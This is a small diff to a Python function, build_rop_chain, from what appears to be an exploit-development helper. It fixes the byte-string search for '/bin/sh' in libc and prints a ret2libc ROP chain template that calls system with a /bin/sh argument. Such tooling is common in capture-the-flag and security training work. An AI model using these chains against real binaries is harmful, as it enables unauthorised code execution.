@@ -72,7 +72,7 @@ def build_rop_chain(binary: str, goal: str = "auto", libc_path: Optional[str] = 
     if libc is not None and goal in ("auto", "system", "ret2libc"):
         out.append("# strategy: ret2libc via provided libc (fill libc_base from your leak):")
         out.append(f"#   system = libc_base + {hex(libc.symbols.get('system', 0))}")
-        binsh_off = next(libc.search(b"/bin/sh\\x00"), None)
+        binsh_off = next(libc.search(b"/bin/sh\x00"), None)
         out.append(f"#   /bin/sh = libc_base + {hex(binsh_off) if binsh_off else '??'}")
         out.append("#   chain = p64(pop_rdi) + p64(libc_base+binsh) + p64(ret) + p64(libc_base+system)")
         return "\n".join(out)
